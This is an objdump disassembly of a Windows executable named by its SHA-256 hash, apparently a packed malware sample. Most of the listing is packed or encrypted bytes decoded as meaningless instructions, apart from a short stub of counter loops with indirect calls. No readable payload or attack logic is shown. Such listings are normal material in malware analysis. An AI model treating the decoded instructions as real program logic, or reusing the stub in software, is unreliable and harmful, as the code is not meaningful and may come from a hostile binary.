
57abd75a77d58ec3c2371f3e6d61d833561660f0cc180f5332bce8fd040e7309.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	or     eax,eax
  401016:	das    
  401017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401018:	jle    0x401098
  40101a:	jle    0x40109a
  40101c:	xor    BYTE PTR [ecx+0x7e],0x7e
  401020:	into   
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xccddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [esi]
  40102d:	push   ebx
  40102e:	or     al,0xf
  401030:	cmp    ecx,DWORD PTR [edi]
  401032:	int3   
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc1
  4010c7:	test   al,0x54
  4010c9:	and    al,0xd0
  4010cb:	jnp    0x4010cc
  4010cd:	adc    BYTE PTR [esi],0x1a
  4010d0:	ret    0x3109
  4010d3:	dec    ebx
  4010d4:	js     0x40109e
  4010d6:	mov    WORD PTR [edx+0xf],ss
  4010d9:	fsub   QWORD PTR ds:0x10557548
  4010df:	idiv   DWORD PTR [ebp+ecx*1+0x2185f024]
  4010e6:	sbb    al,0x10
  4010e8:	sbb    BYTE PTR [esi-0x395e4b07],cl
  4010ee:	xor    eax,0x6c127d31
  4010f3:	mov    cr2,esp
  4010f6:	retf   0x7c7b
  4010f9:	fnsave [edx+0x79]
  4010fc:	out    0x3d,eax
  4010fe:	aaa    
  4010ff:	lods   eax,DWORD PTR ds:[esi]
  401100:	and    DWORD PTR ds:0xb70fe1b4,edi
  401106:	jo     0x401172
  401108:	xor    esp,DWORD PTR ss:[edi-0x9]
  40110c:	or     BYTE PTR [ebx],dl
  40110e:	xchg   esp,eax
  40110f:	lods   al,BYTE PTR ds:[esi]
  401110:	bound  esi,QWORD PTR [esi+0x7e]
  401113:	or     al,0x58
  401115:	dec    edi
  401116:	sub    ebx,DWORD PTR [ebx-0x41133e3]
  40111c:	fist   WORD PTR [esi+0x28ac9bec]
  401122:	jecxz  0x401164
  401124:	push   ss
  401125:	xchg   eax,ecx
  401127:	jns    0x401134
  401129:	into   
  40112a:	rcr    DWORD PTR [ebp+0x66ff2302],0x18
  401131:	jo     0x4010fa
  401133:	or     al,BYTE PTR ds:0xe74d259d
  401139:	js     0x40111b
  40113b:	xor    dh,BYTE PTR [ecx]
  40113d:	pop    eax
  40113e:	arpl   WORD PTR [edi-0x1e1abfe9],ax
  401144:	xor    ebp,DWORD PTR [ebx-0x7391e5d6]
  40114a:	ret    
  40114b:	jnp    0x4011c1
  40114d:	push   edx
  40114e:	mov    esi,0x1ed31d58
  401153:	(bad)  
  401154:	jp     0x40110f
  401156:	inc    eax
  401157:	dec    ebx
  401158:	mov    cl,0x8e
  40115a:	loope  0x4011bc
  40115c:	jge    0x40116d
  40115e:	xchg   edi,eax
  40115f:	xchg   DWORD PTR [edx-0x9],ecx
  401162:	sbb    al,BYTE PTR [ebx]
  401164:	imul   ebx,DWORD PTR [eax],0x3984147b
  40116a:	aad    0x64
  40116c:	lods   al,BYTE PTR ds:[esi]
  40116d:	aas    
  40116e:	push   es
  40116f:	cmp    eax,0x3d566d72
  401174:	test   BYTE PTR [ebx-0x5d],dh
  401177:	xchg   ecx,eax
  401178:	sar    ecx,cl
  40117a:	ret    0xf30a
  40117d:	add    eax,0xaf8465b7
  401182:	lock mov ?,WORD PTR [ebx]
  401185:	(bad)  
  401186:	(bad)  
  401188:	mov    ebx,fs
  40118a:	push   edx
  40118b:	pop    ss
  40118c:	arpl   WORD PTR [ebx],sp
  40118e:	push   0xffffffb6
  401190:	retf   
  401191:	xchg   ecx,eax
  401192:	pop    ds
  401193:	pop    ebx
  401194:	fidiv  DWORD PTR [edx]
  401196:	sbb    BYTE PTR [edi-0x1b73dec],cl
  40119c:	mov    ah,0xa1
  40119e:	fistp  QWORD PTR [ebp-0x7c]
  4011a1:	ins    DWORD PTR es:[edi],dx
  4011a2:	jg     0x401135
  4011a4:	idiv   DWORD PTR [ebx]
  4011a6:	pop    esi
  4011a7:	loop   0x40113e
  4011a9:	shr    DWORD PTR [eax],0x75
  4011ac:	jl     0x40122c
  4011ae:	mov    al,ds:0xb1fc92a6
  4011b3:	sub    dl,BYTE PTR [eax-0x28]
  4011b6:	test   al,0xa
  4011b8:	lods   al,BYTE PTR ds:[esi]
  4011b9:	mov    dh,bl
  4011bb:	sar    BYTE PTR [esi],0xe3
  4011be:	cdq    
  4011bf:	add    ch,dh
  4011c1:	clc    
  4011c2:	rol    BYTE PTR cs:[ebx+0x70acd0e4],1
  4011c9:	sbb    eax,0xb5f72903
  4011ce:	pop    es
  4011cf:	pop    esi
  4011d0:	stos   DWORD PTR es:[edi],eax
  4011d1:	dec    esi
  4011d2:	cmp    eax,esi
  4011d4:	je     0x40119a
  4011d6:	cdq    
  4011d7:	retf   0xf75b
  4011da:	xchg   edx,eax
  4011db:	int3   
  4011dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011dd:	jnp    0x401175
  4011df:	jmp    0x4011c0
  4011e1:	call   0x6dbe3914
  4011e6:	sbb    esi,DWORD PTR [edi-0x5]
  4011e9:	pop    esi
  4011ea:	aad    0xa7
  4011ec:	das    
  4011ed:	call   FWORD PTR [ecx+ebp*4-0x29]
  4011f1:	mov    ds:0x6885b6bd,al
  4011f6:	fdiv   QWORD PTR [eax+esi*2+0x48523b29]
  4011fd:	shl    DWORD PTR [edi],cl
  4011ff:	jbe    0x401222
  401201:	out    0x4e,al
  401203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401204:	mov    esi,0xbc0d8e6e
  401209:	lds    edi,FWORD PTR [edi+0x29]
  40120c:	lods   eax,DWORD PTR ds:[esi]
  40120d:	jbe    0x401239
  40120f:	inc    edi
  401210:	jns    0x401211
  401212:	in     eax,dx
  401213:	inc    ebp
  401214:	aad    0x98
  401216:	shr    cl,0x75
  401219:	xor    al,0x3e
  40121b:	(bad)  
  40121c:	xor    ebp,eax
  40121e:	daa    
  40121f:	push   es
  401220:	cdq    
  401221:	or     ecx,0x2a384b8
  401227:	inc    eax
  401228:	(bad)
  40122c:	sbb    edx,DWORD PTR [ebx-0x6a786c51]
  401232:	fst    QWORD PTR [eax+0xd]
  401235:	push   cs
  401236:	stc    
  401237:	je     0x401286
  401239:	jge    0x401258
  40123b:	dec    eax
  40123c:	and    eax,edx
  40123e:	retf   0x274b
  401241:	fisubr DWORD PTR [ecx]
  401243:	not    ebx
  401245:	nop
  401246:	inc    ebp
  401247:	jle    0x40125d
  401249:	add    ebx,DWORD PTR [edx+0x3c]
  40124c:	push   0xfffffffa
  40124e:	ins    BYTE PTR es:[edi],dx
  40124f:	push   edx
  401250:	xchg   BYTE PTR [edi-0x41],cl
  401253:	sbb    al,0xf0
  401255:	dec    edx
  401256:	and    ah,ch
  401258:	popf   
  401259:	pusha  
  40125a:	xlat   BYTE PTR ds:[ebx]
  40125b:	fmul   DWORD PTR [ecx+0x22a0edd8]
  401261:	mov    dl,0xfd
  401263:	cld    
  401264:	mov    ds:0x131e92c3,eax
  401269:	mov    BYTE PTR [edi+eax*1],bh
  40126c:	pop    es
  40126d:	nop
  40126e:	adc    dh,dl
  401270:	add    DWORD PTR [edi+0x46],0xffffff8c
  401274:	ret    0xebe1
  401277:	fstp   DWORD PTR [edi]
  401279:	mov    esi,0x9aedca52
  40127e:	shl    BYTE PTR [ebx],1
  401280:	inc    edi
  401281:	wrmsr  
  401283:	cmc    
  401284:	add    DWORD PTR [ebp+0x3b234ada],0xaa57f19f
  40128e:	push   ds
  40128f:	pop    edx
  401290:	in     eax,dx
  401291:	mov    bh,0xdd
  401293:	xchg   ecx,ebx
  401295:	je     0x401247
  401297:	sub    esi,esp
  401299:	test   al,0x37
  40129b:	mov    ch,BYTE PTR ds:0x9728dcd4
  4012a1:	push   0xffffffac
  4012a3:	mov    eax,0xa616ebb4
  4012a8:	retf   0xd265
  4012ab:	int    0x9
  4012ad:	rcr    dh,0x2
  4012b0:	or     bl,dh
  4012b2:	cld    
  4012b3:	out    dx,eax
  4012b4:	das    
  4012b5:	mov    ds:0xf8d9d3f,eax
  4012ba:	push   cs
  4012bb:	hlt    
  4012bc:	push   ds
  4012bd:	mov    eax,ds:0x93652cdd
  4012c2:	add    ebp,ebp
  4012c4:	lods   al,BYTE PTR ds:[esi]
  4012c5:	jbe    0x4012ff
  4012c7:	xor    BYTE PTR [esi-0xc360e6a],bl
  4012cd:	adc    esp,DWORD PTR [ecx-0x68]
  4012d0:	div    edi
  4012d2:	stc    
  4012d3:	scas   eax,DWORD PTR es:[edi]
  4012d4:	mov    ebp,0xac3fa740
  4012d9:	stc    
  4012da:	mov    ss,WORD PTR [ebp+0x594f9987]
  4012e0:	pop    eax
  4012e1:	pop    ecx
  4012e2:	xchg   al,al
  4012e4:	add    cl,ch
  4012e6:	jmp    0x40127f
  4012e8:	loope  0x4012fb
  4012ea:	fs loope 0x4012a9
  4012ed:	pop    esp
  4012ee:	add    edi,DWORD PTR [edx+edi*1-0xb86e8de]
  4012f5:	push   ebx
  4012f6:	and    bh,BYTE PTR [ecx-0x45136740]
  4012fc:	xor    cl,BYTE PTR [ebp+0x9f0c99]
  401302:	sahf   
  401303:	inc    edx
  401304:	lds    edx,FWORD PTR [ebx-0x7e]
  401307:	adc    al,0x3b
  401309:	sbb    eax,0xa046682f
  40130e:	jo     0x40137c
  401310:	aas    
  401311:	mov    ds:0x8056ea28,al
  401316:	inc    edx
  401317:	inc    eax
  401318:	or     bl,BYTE PTR [ecx]
  40131a:	or     al,0xed
  40131c:	lods   eax,DWORD PTR ds:[esi]
  40131d:	shl    DWORD PTR [esi-0x1e],cl
  401320:	ja     0x4012b9
  401322:	pop    edi
  401323:	(bad)  
  401325:	fwait
  401326:	dec    edi
  401327:	add    DWORD PTR [esi+edi*8+0x45],0xffffffa3
  40132c:	cmc    
  40132d:	mul    DWORD PTR [edx+0x4d]
  401330:	sub    DWORD PTR [esi-0x70],edi
  401333:	adc    al,0x31
  401335:	mov    WORD PTR [esi],ss
  401337:	sar    esi,1
  401339:	and    al,0x60
  40133b:	mov    ah,0x90
  40133d:	inc    esi
  40133e:	inc    ebp
  40133f:	push   0x855d197d
  401344:	mov    ah,BYTE PTR [esi]
  401346:	or     al,0x75
  401348:	xor    BYTE PTR [eax-0x16],cl
  40134b:	lods   al,BYTE PTR ds:[esi]
  40134c:	push   0x7f
  40134e:	loope  0x4012fc
  401350:	test   bl,0x8
  401353:	xchg   ecx,eax
  401354:	mov    al,ds:0x55efe465
  401359:	add    BYTE PTR [ecx-0x78792c27],al
  40135f:	loopne 0x401309
  401361:	xor    eax,0x10f4dd1c
  401366:	push   0xc8ed2f17
  40136b:	sar    BYTE PTR [esi+ecx*2+0x505197e2],cl
  401372:	leave  
  401373:	call   0x9e44df4b
  401378:	stos   BYTE PTR es:[edi],al
  401379:	sbb    ecx,ebp
  40137b:	dec    ebx
  40137c:	(bad)  
  40137d:	cmp    ch,BYTE PTR [ebx]
  40137f:	neg    DWORD PTR [edi+edi*4+0x668ac613]
  401386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401387:	call   0x1c624c2
  40138c:	sub    eax,0x925fdd40
  401391:	pop    edi
  401392:	les    esi,FWORD PTR [ebx-0x10]
  401395:	sar    BYTE PTR [edi],cl
  401397:	loop   0x4013a9
  401399:	add    cl,BYTE PTR [edi+0x55]
  40139c:	and    dh,BYTE PTR ds:0x390ad5bb
  4013a2:	pop    edi
  4013a3:	or     al,0xea
  4013a5:	sub    eax,0x8402ad08
  4013aa:	js     0x401380
  4013ac:	mov    bl,0x2d
  4013ae:	cmp    esi,DWORD PTR [eax+0x62]
  4013b1:	sbb    esp,DWORD PTR [esi+0x2cec8393]
  4013b7:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  4013be:	sbb    DWORD PTR ds:0x430506,edi
  4013c4:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4013cb:	sub    ecx,eax
  4013cd:	mov    eax,0x9507
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42eea0,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42eea0,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42eea0,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42ea6c
  401403:	mov    ecx,DWORD PTR ds:0x42eea0
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42eea0,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42eea4
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x4305d6,0x15
  401428:	cmp    DWORD PTR ds:0x4305d6,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x4305d6,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e865
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42ea70
  40145f:	cmp    DWORD PTR ds:0x4305d6,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x4305d6
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x4305d6,ecx
  401479:	mov    ecx,DWORD PTR ds:0x4305d6
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x4305d6,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43051a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0xed50:0xc48b26e
  4014ab:	or     eax,0x71822376
  4014b0:	jle    0x401530
  4014b2:	xor    BYTE PTR [ecx+0x7e],0x7e
  4014b6:	xchg   edi,eax
  4014b7:	scas   al,BYTE PTR es:[edi]
  4014b8:	neg    DWORD PTR [ecx]
  4014ba:	std    
  4014bb:	inc    ebx
  4014bc:	inc    ecx
  4014bd:	pop    eax
  4014be:	dec    esi
  4014bf:	mov    esi,0x9c730322
  4014c4:	hlt    
  4014c5:	dec    edi
  4014c6:	aaa    
  4014c7:	sub    DWORD PTR [ebx+0x4b6d2bb3],esp
  4014cd:	out    dx,eax
  4014ce:	sub    bl,al
  4014d0:	mov    ch,dl
  4014d2:	rcr    DWORD PTR ds:0xc63aab62,0x3f
  4014d9:	test   eax,0xdd2e2e3b
  4014de:	jmp    0x9019:0xe53b0f4e
  4014e5:	mov    dl,0x9b
  4014e7:	sub    ecx,0x5e2fadc8
  4014ed:	lock sub BYTE PTR [esi+0x3dfb54bf],bl
  4014f4:	mov    bl,0x65
  4014f6:	mov    esp,0x4704ccb1
  4014fb:	cld    
  4014fc:	fcom   QWORD PTR [eax-0x74]
  4014ff:	xor    BYTE PTR [ebx+esi*1],cl
  401502:	shl    DWORD PTR [esi+0x6b3895f3],0xe
  401509:	mov    WORD PTR [edi],?
  40150b:	jb     0x401578
  40150d:	(bad)  
  40150e:	in     eax,0x90
  401510:	sbb    ebx,DWORD PTR [edi+0x55]
  401513:	add    dl,BYTE PTR [eax]
  401515:	adc    eax,0x6615a973
  40151a:	stos   BYTE PTR es:[edi],al
  40151b:	ds mov edi,0x31f6c7e3
  401521:	push   cs
  401522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401523:	push   esi
  401524:	shl    BYTE PTR [eax],cl
  401526:	mov    bl,0x7c
  401528:	imul   edx,DWORD PTR [ecx-0x69acc12c],0x78
  40152f:	pop    ebp
  401530:	jl     0x40157e
  401532:	and    DWORD PTR [edi-0x3f87b476],esi
  401538:	shl    bh,1
  40153a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40153b:	cmp    BYTE PTR [edi-0x64],cl
  40153e:	pop    ecx
  40153f:	push   esp
  401540:	and    BYTE PTR [eax],dh
  401542:	push   ds
  401543:	pop    esp
  401544:	(bad)  
  401545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401546:	push   esp
  401547:	dec    BYTE PTR es:[esi+0xc]
  40154b:	jb     0x4014e0
  40154d:	or     dl,BYTE PTR [ebp+0x79]
  401550:	cmc    
  401551:	dec    ebx
  401552:	ret    
  401553:	push   edi
  401554:	and    eax,0x82f46edd
  401559:	ficom  WORD PTR [eax+0x3a]
  40155c:	mov    esi,ebx
  40155e:	fwait
  40155f:	jae    0x4015d6
  401561:	adc    ecx,edi
  401563:	in     al,dx
  401564:	inc    esp
  401565:	sbb    ecx,DWORD PTR [esi-0x1e]
  401568:	daa    
  401569:	aas    
  40156a:	pusha  
  40156b:	jle    0x401573
  40156d:	repnz xor BYTE PTR [ecx],bh
  401570:	xchg   BYTE PTR [edx-0x564c3e99],ch
  401576:	mov    al,0xd3
  401578:	pushw  0xda40
  40157c:	mov    ebp,0xf84f3583
  401581:	push   cs
  401582:	ins    DWORD PTR es:[edi],dx
  401583:	jp     0x401584
  401585:	fst    QWORD PTR [eax+edx*1-0x50]
  401589:	mov    bl,0x1c
  40158b:	mov    WORD PTR [edx],es
  40158d:	push   ds
  40158e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40158f:	in     eax,0xa0
  401591:	push   ebp
  401592:	mov    ebp,0x5865a0d5
  401597:	sub    cl,al
  401599:	push   ecx
  40159a:	push   ecx
  40159b:	mov    esi,0xfc0137d9
  4015a0:	ds push ebx
  4015a2:	test   BYTE PTR [ecx],al
  4015a4:	sub    eax,DWORD PTR [edx+0x6a]
  4015a7:	jge    0x4015d9
  4015a9:	ficom  DWORD PTR [ebx]
  4015ab:	call   0x91452f8c
  4015b0:	pop    ss
  4015b1:	call   0xeaf1d947
  4015b6:	jecxz  0x401595
  4015b8:	inc    ebp
  4015b9:	sub    al,0x75
  4015bb:	shl    BYTE PTR [edx+ebx*1],1
  4015be:	int    0x96
  4015c0:	or     al,0xa1
  4015c2:	les    edi,FWORD PTR [esi-0x3d84024]
  4015c8:	sbb    al,0x7b
  4015ca:	int    0x46
  4015cc:	mov    ds:0x242a41a8,al
  4015d1:	mov    eax,ds:0x85b3f580
  4015d6:	push   ecx
  4015d7:	sbb    BYTE PTR [ebp-0x44],0xe1
  4015db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015dc:	pop    ds
  4015dd:	mov    al,0x82
  4015df:	jge    0x4015a9
  4015e1:	cs and dh,ah
  4015e4:	fistp  WORD PTR [ebp-0x5]
  4015e7:	and    BYTE PTR [ebx],al
  4015e9:	xchg   ebx,eax
  4015ea:	push   ebp
  4015eb:	scas   eax,DWORD PTR es:[edi]
  4015ec:	shr    BYTE PTR [ecx-0x26e7a6f2],cl
  4015f2:	mov    eax,ds:0x4fcd5252
  4015f7:	repnz and eax,0xf7008401
  4015fd:	dec    esp
  4015fe:	iret   
  4015ff:	push   cs
  401600:	mov    ebx,0x4a6de452
  401605:	jb     0x40166a
  401607:	jmp    0x4852:0xe109ce4d
  40160e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  401610:	pop    edx
  401611:	push   ebp
  401612:	mul    cl
  401614:	fisub  DWORD PTR ds:0xc6e1b570
  40161a:	icebp  
  40161b:	ret    
  40161c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40161d:	sub    DWORD PTR [ecx-0x6c],edx
  401620:	xbegin 0xa783da12
  401626:	xchg   edi,eax
  401627:	cmp    DWORD PTR cs:[eax+0x35],esp
  40162b:	in     eax,0xd8
  40162d:	stos   BYTE PTR es:[edi],al
  40162e:	mov    eax,DWORD PTR [eax-0x22]
  401631:	dec    ecx
  401632:	fwait
  401633:	jae    0x40160d
  401635:	shl    DWORD PTR [ecx-0x65],cl
  401638:	iret   
  401639:	mov    esi,0x40abb158
  40163e:	push   edx
  40163f:	add    dl,0xeb
  401642:	ss inc esi
  401644:	stos   BYTE PTR es:[edi],al
  401645:	mov    al,ds:0x9e9eacd5
  40164a:	jno    0x40164b
  40164c:	lods   eax,DWORD PTR ds:[esi]
  40164d:	xor    al,0xe
  40164f:	stos   BYTE PTR es:[edi],al
  401650:	pop    esi
  401651:	sub    al,0x3d
  401653:	fdivr  QWORD PTR [edx+0x350ab508]
  401659:	das    
  40165a:	cli    
  40165b:	stos   BYTE PTR es:[edi],al
  40165c:	ror    DWORD PTR [esp+esi*1-0x69177cd0],0x3a
  401664:	push   ecx
  401665:	mov    edx,0x46e9dac
  40166a:	pop    ds
  40166b:	in     al,0x49
  40166d:	and    bl,bl
  40166f:	xor    ecx,0x75
  401672:	pop    ebp
  401673:	call   0xc608:0xaa9e8036
  40167a:	ja     0x4016b1
  40167c:	or     al,0xa
  40167e:	call   0x231267af
  401683:	add    dl,BYTE PTR [ecx]
  401685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401686:	rcr    DWORD PTR [edx-0x46],1
  401689:	lea    edi,[eax-0x16bda002]
  40168f:	sub    al,0x9
  401691:	shl    DWORD PTR [esi+0xe],1
  401694:	fisttp QWORD PTR [ecx+0x768854af]
  40169a:	mov    edi,0x2bd4f4d6
  40169f:	fnstenv [esi]
  4016a1:	imul   eax,esp,0xd53c6df8
  4016a7:	cmp    al,0x1f
  4016a9:	test   al,0x1d
  4016ab:	test   al,0x4d
  4016ad:	xor    dh,BYTE PTR [ebx-0x63]
  4016b0:	sub    eax,0x84f97a12
  4016b5:	ja     0x401664
  4016b7:	sub    eax,0xf0fcaac1
  4016bc:	inc    esp
  4016bd:	push   ss
  4016be:	dec    edx
  4016bf:	mov    esp,DWORD PTR [esi]
  4016c1:	mov    al,0x5
  4016c3:	sbb    eax,0x1a68e569
  4016c8:	and    ebp,DWORD PTR [edi]
  4016ca:	cmp    DWORD PTR [ecx+0x58cf03ae],ebx
  4016d0:	push   ss
  4016d1:	or     ebx,eax
  4016d3:	cli    
  4016d4:	ror    DWORD PTR [esi+ecx*4],0x44
  4016d8:	je     0x4016d3
  4016da:	icebp  
  4016db:	loope  0x401680
  4016dd:	mov    esp,0xf79c0239
  4016e2:	int3   
  4016e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016e4:	mov    ecx,0xf264ebcf
  4016e9:	jge    0x401735
  4016eb:	addr16 jmp 0xe1e04064
  4016f1:	xlat   BYTE PTR ds:[ebx]
  4016f2:	js     0x4016ca
  4016f4:	and    BYTE PTR [ecx+0x74],bh
  4016f7:	push   edx
  4016f8:	out    dx,eax
  4016f9:	xchg   ebx,edi
  4016fb:	aad    0x82
  4016fd:	xchg   edi,eax
  4016fe:	lods   al,BYTE PTR ds:[esi]
  4016ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401700:	test   DWORD PTR [ecx],esi
  401702:	mov    al,BYTE PTR [edi]
  401704:	rcl    BYTE PTR [ebp-0x6d],1
  401707:	pop    edx
  401708:	inc    edi
  401709:	test   DWORD PTR [edx-0x658dd310],0xcab2f299
  401713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401714:	push   0xb080ae9a
  401719:	jnp    0x401707
  40171b:	ins    DWORD PTR es:[edi],dx
  40171c:	cs push ds
  40171e:	xor    eax,0x979875fd
  401723:	inc    ebp
  401724:	enter  0x7540,0x88
  401728:	(bad)  
  401729:	jmp    0xab05740a
  40172e:	ins    BYTE PTR es:[edi],dx
  40172f:	sbb    edi,edi
  401731:	imul   edi,DWORD PTR [edx],0xffffff96
  401734:	dec    edi
  401735:	arpl   WORD PTR [esi+0x7f535e1c],cx
  40173b:	sub    ebp,ecx
  40173d:	mov    esi,0xfe420f4c
  401742:	jecxz  0x40179f
  401744:	les    eax,FWORD PTR [ecx+eax*2-0x323bac0d]
  40174b:	sub    DWORD PTR [ebx],esi
  40174d:	and    eax,0x8aa977de
  401752:	hlt    
  401753:	in     eax,0xe0
  401755:	iret   
  401756:	inc    eax
  401757:	out    dx,eax
  401758:	sub    al,0xda
  40175a:	nop
  40175b:	push   ds
  40175c:	jne    0x401720
  40175e:	enter  0xfc2,0xe5
  401762:	in     eax,dx
  401763:	mov    ch,0x2a
  401765:	icebp  
  401766:	xor    DWORD PTR [esi-0x9],ecx
  401769:	jo     0x401757
  40176b:	jge    0x4017c8
  40176d:	cdq    
  40176e:	lock cmp eax,DWORD PTR [edx]
  401771:	scas   al,BYTE PTR es:[edi]
  401772:	xlat   BYTE PTR ds:[ebx]
  401773:	adc    BYTE PTR [edx-0x58125081],0x64
  40177a:	call   0xcfc3:0x7ad65e4b
  401781:	push   esi
  401782:	jg     0x40179c
  401784:	es dec eax
  401786:	cli    
  401787:	into   
  401788:	leave  
  401789:	in     eax,0x36
  40178b:	xchg   edi,eax
  40178c:	imul   ebp,DWORD PTR [eax-0x11e160c7],0xecb54d85
  401796:	pusha  
  401797:	in     al,0x9c
  401799:	nop
  40179a:	xchg   esi,eax
  40179b:	bound  edi,QWORD PTR [eax-0x60239efa]
  4017a1:	jmp    0x4017a7
  4017a3:	ds int3 
  4017a5:	fist   DWORD PTR [edi+0x2f89f82c]
  4017ab:	mov    dl,0x2
  4017ad:	or     al,0x11
  4017af:	int3   
  4017b0:	mov    dl,0xe9
  4017b2:	xchg   BYTE PTR ds:0x127f34d,al
  4017b8:	repz and DWORD PTR [edx+0x209c3232],eax
  4017bf:	btr    DWORD PTR [eax],eax
  4017c2:	inc    ebx
  4017c3:	fisttp QWORD PTR [ebp+0x61]
  4017c6:	ds push eax
  4017c8:	(bad)  
  4017c9:	fadd   st,st(5)
  4017cb:	adc    ebx,ecx
  4017cd:	xchg   ebp,eax
  4017ce:	sbb    ebx,DWORD PTR [ecx+eiz*2+0x6]
  4017d2:	call   0xcb0f:0x78e43827
  4017d9:	push   esi
  4017da:	jne    0x401851
  4017dc:	mov    ebp,0x45d32dea
  4017e1:	imul   BYTE PTR [ebx+0x220de3d2]
  4017e7:	adc    ecx,DWORD PTR [edx-0x3fc0fe37]
  4017ed:	sbb    al,0x7c
  4017ef:	mov    BYTE PTR [edx-0x5],bh
  4017f2:	loopne 0x401808
  4017f4:	mov    edx,0xfe29fbb7
  4017f9:	xchg   edx,eax
  4017fa:	push   cs
  4017fb:	push   es
  4017fc:	xchg   esi,esp
  4017fe:	xchg   ebx,eax
  4017ff:	dec    ebp
  401800:	dec    edi
  401801:	add    dh,BYTE PTR [esi+eiz*8-0x3]
  401805:	add    eax,0xe3572ed4
  40180a:	xor    al,0x24
  40180c:	adc    eax,DWORD PTR [eax+0x5a]
  40180f:	xchg   ebp,eax
  401810:	pop    ss
  401811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401812:	xor    bl,BYTE PTR [ecx-0x62cc2ec4]
  401818:	pop    ss
  401819:	cmp    al,0x4
  40181b:	mov    esp,0x1363b502
  401820:	mov    ah,0x3c
  401822:	pop    ecx
  401823:	mov    dh,0xd5
  401825:	inc    esp
  401826:	mov    BYTE PTR [esi-0x20],cl
  401829:	cmp    ecx,DWORD PTR [eax]
  40182b:	fs push ss
  40182d:	loopne 0x401827
  40182f:	push   edx
  401830:	aad    0xf2
  401832:	mov    ch,0x17
  401834:	loopne 0x40183d
  401836:	jle    0x4017b9
  401838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401839:	add    edi,ebp
  40183b:	push   edx
  40183c:	test   eax,0xffdc46ae
